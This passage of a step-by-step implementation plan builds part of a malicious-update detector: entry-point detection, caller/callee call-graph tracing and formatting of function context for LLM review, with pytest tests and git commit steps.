# Modify _is_entry in src/analysis/call_graph.py

ENTRY_DECORATOR_PATTERNS = [
    "@app.route", "@router.get", "@router.post", "@celery.task",
    "@click.command", "@click.group",
    "@scheduled", "@cron", "@periodic_task", "@task",
    "@repeat", "@recurrent",
]

ENTRY_CODE_PATTERNS = [
    "Thread(target=", "Thread(target =",
    "Process(target=", "Process(target =",
    "Timer(",
    "threading.Thread", "multiprocessing.Process",
]


def _is_entry(method_name: str, decorators: list[str], body_source: str) -> bool:
    """Check if a function is an entry point based on decorators or body patterns."""
    for dec in decorators:
        for pat in ENTRY_DECORATOR_PATTERNS:
            if pat in dec:
                return True
    for pat in ENTRY_CODE_PATTERNS:
        if pat in body_source:
            return True
    return False
```

Also update the call to `_is_entry` in `parse_file_functions` to pass the body source:

```python
# In parse_file_functions, change the decorated_definition block:
                    funcs.append(FuncNode(
                        key=f"{file_path}:{qname}",
                        file_path=file_path,
                        name=func_name,
                        qualified_name=qname,
                        start_line=child.start_point[0] + 1,
                        end_line=child.end_point[0] + 1,
                        source_hash=hashlib.sha256(body_source.encode("utf-8")).hexdigest(),
                        is_entry=_is_entry(func_name, decorators, body_source),
                    ))
```

- [ ] **Step 3: Run entry point test**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py::test_entry_point_detection -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/analysis/call_graph.py tests/test_call_graph.py
git commit -m "feat: add entry point detection (decorators, thread/process patterns)"
```

---

### Task 7: Context builder — trace callee and caller chains

**Files:**
- Create: `src/pipeline/context_builder.py`
- Create: `tests/test_context_builder.py`

- [ ] **Step 1: Write the test for context assembly**

```python
# tests/test_context_builder.py
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.analysis.call_graph import EvolvingCallGraph, FuncNode, CallEdge
from src.pipeline.context_builder import ContextBuilder, CallerPath, CalleePath


def make_graph_with_chain():
    """Build a test call graph:
    
    [ENTRY] periodic_scan (scheduler.py)
         |
         v
       collect_data (collector.py)        <-- changed function
         |         \
         v          v
      _read_files  _send_data (uploader.py)
                       |
                       v
                  requests.post [EXTERNAL]
    """
    g = EvolvingCallGraph()
    # Nodes
    g.add_node(FuncNode("scheduler.py:periodic_scan", "scheduler.py", "periodic_scan",
                         "periodic_scan", 1, 5, "aaa", is_entry=True))
    g.add_node(FuncNode("collector.py:collect_data", "collector.py", "collect_data",
                         "collect_data", 1, 10, "bbb"))
    g.add_node(FuncNode("collector.py:_read_files", "collector.py", "_read_files",
                         "_read_files", 12, 15, "ccc"))
    g.add_node(FuncNode("uploader.py:_send_data", "uploader.py", "_send_data",
                         "_send_data", 1, 5, "ddd"))
    # Edges
    g.add_edge(CallEdge("scheduler.py:periodic_scan", "collector.py:collect_data", 3))
    g.add_edge(CallEdge("collector.py:collect_data", "collector.py:_read_files", 5))
    g.add_edge(CallEdge("collector.py:collect_data", "uploader.py:_send_data", 7))
    g.add_edge(CallEdge("uploader.py:_send_data", "EXTERNAL:requests.post", 3, is_external=True))
    g.propagate_categories()
    return g


def test_trace_callees_finds_network_path():
    g = make_graph_with_chain()
    builder = ContextBuilder(g)
    
    paths = builder.trace_callees("collector.py:collect_data", max_depth=3)
    callee_keys = [p.target_key for p in paths if p.terminates_at_external]
    assert any("requests.post" in k for k in callee_keys), \
        f"Should find requests.post path, got: {callee_keys}"


def test_trace_callers_stops_at_entry():
    g = make_graph_with_chain()
    builder = ContextBuilder(g)
    
    paths = builder.trace_callers("collector.py:collect_data", max_depth=5)
    # Should find periodic_scan as the entry point caller
    entry_paths = [p for p in paths if p.is_entry]
    assert len(entry_paths) >= 1
    assert any("periodic_scan" in p.target_key for p in entry_paths)


def test_assemble_context_returns_structured_result():
    g = make_graph_with_chain()
    builder = ContextBuilder(g)
    
    ctx = builder.assemble("collector.py:collect_data", max_depth=2)
    assert ctx.changed_func_key == "collector.py:collect_data"
    assert len(ctx.callee_paths) > 0
    assert len(ctx.caller_paths) > 0
    # Callee path should include _send_data -> requests.post
    assert any("requests.post" in p.target_key for p in ctx.callee_paths
               if p.terminates_at_external)
```

- [ ] **Step 2: Implement ContextBuilder with trace_callees and trace_callers**

```python
# src/pipeline/context_builder.py
"""Build LLM-ready context from evolving call graph and commit diffs."""

from __future__ import annotations
from dataclasses import dataclass, field
from collections import deque

from src.analysis.call_graph import EvolvingCallGraph, FuncNode, CallEdge


@dataclass
class CalleePath:
    """A path from the changed function down to a callee."""
    target_key: str
    depth: int
    terminates_at_external: bool = False
    categories: set[str] = field(default_factory=set)


@dataclass
class CallerPath:
    """A path from the changed function up to a caller."""
    target_key: str
    depth: int
    is_entry: bool = False


@dataclass
class AssembledContext:
    """The complete context for LLM evaluation of a changed function."""
    changed_func_key: str
    changed_func: FuncNode | None
    callee_paths: list[CalleePath]
    caller_paths: list[CallerPath]
    primary_categories: set[str]


class ContextBuilder:
    """Assembles LLM-ready context from an EvolvingCallGraph."""

    def __init__(self, call_graph: EvolvingCallGraph):
        self.graph = call_graph

    def trace_callees(self, func_key: str, max_depth: int = 2) -> list[CalleePath]:
        """Trace downward from func_key through the call graph.
        
        Only expands through callees whose categories match relevant patterns,
        or if the callee is an intra-project function.
        Stops at EXTERNAL calls or max_depth.
        """
        paths: list[CalleePath] = []
        visited: set[str] = set()
        queue = deque([(func_key, 0)])

        while queue:
            current, depth = queue.popleft()
            if current in visited or depth > max_depth:
                continue
            if current != func_key:
                visited.add(current)

            for edge in self.graph.edges.get(current, []):
                callee_key = edge.callee_key
                if callee_key in visited:
                    continue

                if edge.is_external:
                    paths.append(CalleePath(
                        target_key=callee_key,
                        depth=depth + 1,
                        terminates_at_external=True,
                    ))
                else:
                    callee_node = self.graph.nodes.get(callee_key)
                    cats = callee_node.categories if callee_node else set()
                    paths.append(CalleePath(
                        target_key=callee_key,
                        depth=depth + 1,
                        categories=cats,
                    ))
                    # Only expand into project functions that have relevant categories
                    if cats and depth + 1 < max_depth:
                        queue.append((callee_key, depth + 1))

        return paths

    def trace_callers(self, func_key: str, max_depth: int = 5) -> list[CallerPath]:
        """Trace upward from func_key to find entry points.
        
        Stops at entry points (detected by is_entry flag on FuncNode).
        Includes all intermediate callers up to the entry point.
        Returns paths sorted by depth (shortest first).
        """
        paths: list[CallerPath] = []
        visited: set[str] = set()
        queue = deque([(func_key, 0, [])])

        while queue:
            current, depth, ancestor_chain = queue.popleft()
            if current in visited or depth > max_depth:
                continue
            visited.add(current)

            for caller_key in self.graph.reverse_edges.get(current, []):
                if caller_key in visited or caller_key in ancestor_chain:
                    continue

                caller_node = self.graph.nodes.get(caller_key)
                is_entry = caller_node.is_entry if caller_node else False

                paths.append(CallerPath(
                    target_key=caller_key,
                    depth=depth + 1,
                    is_entry=is_entry,
                ))

                if not is_entry and depth + 1 < max_depth:
                    queue.append((caller_key, depth + 1,
                                  ancestor_chain + [caller_key]))

        # Sort: entry paths first, then by depth ascending
        paths.sort(key=lambda p: (not p.is_entry, p.depth))
        return paths

    def assemble(self, func_key: str, max_depth: int = 2) -> AssembledContext:
        """Assemble complete context for a changed function."""
        node = self.graph.nodes.get(func_key)
        callees = self.trace_callees(func_key, max_depth)
        callers = self.trace_callers(func_key, max_depth=5)

        # Collect primary categories from callee paths
        all_cats: set[str] = set()
        for p in callees:
            all_cats |= p.categories

        return AssembledContext(
            changed_func_key=func_key,
            changed_func=node,
            callee_paths=callees,
            caller_paths=callers,
            primary_categories=all_cats,
        )
```

- [ ] **Step 3: Run all context tests**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_context_builder.py -v`
Expected: 3 PASS

- [ ] **Step 4: Commit**

```bash
git add src/pipeline/context_builder.py tests/test_context_builder.py
git commit -m "feat: add ContextBuilder with callee/caller chain tracing"
```

---

### Task 8: Format LLM-ready text output

**Files:**
- Modify: `src/pipeline/context_builder.py` (add `format_for_llm` method)
- Modify: `tests/test_context_builder.py` (add format test)

- [ ] **Step 1: Write test for LLM text formatting**

```python
# Append to tests/test_context_builder.py

def test_format_for_llm_produces_readable_text():
    g = make_graph_with_chain()
    builder = ContextBuilder(g)
    ctx = builder.assemble("collector.py:collect_data")
    text = builder.format_for_llm(ctx, repo_path="/tmp/test_repo")

    # Should include the changed function info
    assert "collect_data" in text
    assert "CHANGED" in text
    # Should include caller info
    assert "periodic_scan" in text or "CALLER" in text
    # Should include callee info  
    assert "requests.post" in text or "CALLEE" in text
    # Should not be empty
    assert len(text) > 100


def test_format_for_llm_respects_max_lines():
    g = make_graph_with_chain()
    builder = ContextBuilder(g)
    ctx = builder.assemble("collector.py:collect_data")
    text = builder.format_for_llm(ctx, repo_path="/tmp/test_repo", max_lines=5)
    lines = text.strip().split("\n")
    assert len(lines) <= 5 + 3  # +3 for section headers
```

- [ ] **Step 2: Implement format_for_llm**

```python
# Append to ContextBuilder class in src/pipeline/context_builder.py

    def format_for_llm(
        self,
        ctx: AssembledContext,
        repo_path: str = "",
        max_lines: int = 200,
    ) -> str:
        """Format an AssembledContext as human-readable text for LLM evaluation."""
        lines: list[str] = []

        # Changed function header
        node = ctx.changed_func
        if node:
            cats_str = ", ".join(sorted(ctx.primary_categories)) if ctx.primary_categories else "none"
            lines.append(f"## [CHANGED] {node.name}() ({node.file_path}:{node.start_line}-{node.end_line})")
            if ctx.primary_categories:
                lines.append(f"## Categories reached: {cats_str}")
            lines.append("")

        # Caller section (who triggers this)
        if ctx.caller_paths:
            lines.append("### CALLERS (trigger path)")
            shown = 0
            for p in ctx.caller_paths:
                if shown >= 2:
                    remaining = len(ctx.caller_paths) - shown
                    if remaining > 0:
                        lines.append(f"[... {remaining} more caller paths omitted]")
                    break
                caller = self.graph.nodes.get(p.target_key)
                if caller:
                    tag = "[ENTRY]" if p.is_entry else f"[L{p.depth}]"
                    lines.append(f"### {tag} {caller.name}() ({caller.file_path}:{caller.start_line}-{caller.end_line})")
                shown += 1
            lines.append("")

        # Callee section (what this reaches)
        if ctx.callee_paths:
            lines.append("### CALLEES (what this function reaches)")
            shown = 0
            for p in ctx.callee_paths:
                if shown >= 10:
                    remaining = len(ctx.callee_paths) - shown
                    if remaining > 0:
                        lines.append(f"[... {remaining} more callee paths omitted]")
                    break
                if p.terminates_at_external:
                    name = p.target_key.replace("EXTERNAL:", "")
                    lines.append(f"- [EXTERNAL L{p.depth}] {name}")
                else:
                    callee = self.graph.nodes.get(p.target_key)
                    if callee:
                        cats = ", ".join(sorted(p.categories)) if p.categories else ""
                        lines.append(f"- [L{p.depth}] {callee.name}() ({callee.file_path})" + 
                                     (f" -> {cats}" if cats else ""))
                shown += 1
            lines.append("")

        # Truncate if too long
        if len(lines) > max_lines:
            lines = lines[:max_lines]
            lines.append(f"\n[... truncated at {max_lines} lines]")

        return "\n".join(lines)
```

- [ ] **Step 3: Run format tests**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_context_builder.py::test_format_for_llm_produces_readable_text tests/test_context_builder.py::test_format_for_llm_respects_max_lines -v`
Expected: 2 PASS

- [ ] **Step 4: Commit**

```bash
git add src/pipeline/context_builder.py tests/test_context_builder.py
git commit -m "feat: add LLM text formatter for assembled context"
```

---

### Task 9: Load function source code from repo for context output

**Files:**
- Modify: `src/pipeline/context_builder.py` (add source loading to format_for_llm)
- Modify: `tests/test_context_builder.py` (update test to verify source appears)

- [ ] **Step 1: Enhance format_for_llm to include actual source code**

```python
# Replace the format_for_llm method in ContextBuilder

    def format_for_llm(
        self,
        ctx: AssembledContext,
        repo_path: str = "",
        max_lines: int = 200,
    ) -> str:
        """Format an AssembledContext as human-readable text with source code."""
        lines: list[str] = []

        # Changed function with source
        node = ctx.changed_func
        if node:
            cats_str = ", ".join(sorted(ctx.primary_categories)) if ctx.primary_categories else "none"
            lines.append(f"## [CHANGED] {node.name}() ({node.file_path}:{node.start_line}-{node.end_line})")
            if ctx.primary_categories:
                lines.append(f"## Categories reached: {cats_str}")
            source = self._read_func_source(repo_path, node)
            if source:
                lines.append("```python")
                lines.append(source.rstrip())
                lines.append("```")
            lines.append("")

        # Caller source
        if ctx.caller_paths:
            shown = 0
            for p in ctx.caller_paths:
                if shown >= 2:
                    remaining = len(ctx.caller_paths) - shown
                    if remaining > 0:
                        lines.append(f"[... {remaining} more callers omitted]")
                    break
                caller = self.graph.nodes.get(p.target_key)
                if caller:
                    tag = "[ENTRY]" if p.is_entry else f"[CALLER L{p.depth}]"
                    lines.append(f"### {tag} {caller.name}() ({caller.file_path}:{caller.start_line}-{caller.end_line})")
                    source = self._read_func_source(repo_path, caller)
                    if source:
                        lines.append("```python")
                        lines.append(source.rstrip())
                        lines.append("```")
                shown += 1
            lines.append("")

        # Callee list (names + categories only, source too verbose for deep chains)
        if ctx.callee_paths:
            lines.append("### Callee chain (what this function calls)")
            shown = 0
            for p in ctx.callee_paths:
                if shown >= 10:
                    lines.append(f"[... {len(ctx.callee_paths) - shown} more]")
                    break
                if p.terminates_at_external:
                    name = p.target_key.replace("EXTERNAL:", "")
                    lines.append(f"- [EXTERNAL] {name}")
                else:
                    callee = self.graph.nodes.get(p.target_key)
                    if callee:
                        cats = ", ".join(sorted(p.categories)) if p.categories else ""
                        lines.append(f"- {callee.name}() in {callee.file_path}" +
                                     (f" [{cats}]" if cats else ""))
                shown += 1
            lines.append("")

        if len(lines) > max_lines:
            lines = lines[:max_lines]
            lines.append(f"\n[... truncated at {max_lines} lines]")

        return "\n".join(lines)

    def _read_func_source(self, repo_path: str, node: FuncNode) -> str | None:
        """Read the source code of a function from disk."""
        if not repo_path:
            return None
        full_path = os.path.join(repo_path, node.file_path)
        try:
            with open(full_path, "r", encoding="utf-8") as f:
                all_lines = f.readlines()
            return "".join(all_lines[node.start_line - 1:node.end_line])
        except (OSError, IndexError):
            return None
```

- [ ] **Step 2: Add os import at top of context_builder.py**

```python
# Add to top of src/pipeline/context_builder.py after existing imports:
import os
```

- [ ] **Step 3: Run all context tests**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_context_builder.py -v`
Expected: 5 PASS

- [ ] **Step 4: Commit**

```bash
git add src/pipeline/context_builder.py tests/test_context_builder.py
git commit -m "feat: add source code loading to LLM context formatter"
```

---

### Task 10: Run full test suite and verify

**Files:**
- None

- [ ] **Step 1: Run all tests**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py tests/test_context_builder.py -v`

Expected: All tests pass (should be ~10 tests total).

- [ ] **Step 2: Verify import chain from orchestrator imports work**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -c "from src.analysis.call_graph import EvolvingCallGraph, parse_file_functions, parse_file_calls; from src.pipeline.context_builder import ContextBuilder; print('All imports OK')"`

Expected: "All imports OK"

- [ ] **Step 3: Commit final state**

```bash
git add -A
git commit -m "feat: complete call graph + context builder subsystem"
```
